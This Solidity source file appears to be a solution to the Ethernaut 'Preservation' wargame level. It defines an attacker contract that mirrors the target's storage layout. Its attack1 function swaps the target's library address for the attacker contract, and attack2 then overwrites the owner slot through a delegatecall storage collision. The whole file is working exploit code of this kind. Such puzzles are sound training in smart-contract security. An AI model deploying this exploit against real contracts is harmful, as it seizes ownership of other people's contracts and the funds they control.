// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
  // function setSecondTime(uint _timeStamp) external; // not required for attack
}


contract MadLibraryContract {

  // replicate storage layout of 'Preservation' contract
  address public timeZone1Library; // placeholder
  address public timeZone2Library; // placeholder
  address public owner; 

  // implement interface of legit 'LibraryContract'
  function setTime(uint _time) public {
    owner = address(_time);
  }

  function attack1(address _preservationContract) external {
    IPreservation(_preservationContract).setFirstTime(uint(address(this))); // replace 'timeZone1Library' with this contract
  }

  // only works after 'attack1' was called
  function attack2(address _preservationContract) external {
    IPreservation(_preservationContract).setFirstTime(uint(msg.sender)); // call 'setTime' of this contract to set owner of 'Preservation' contract
  }
}
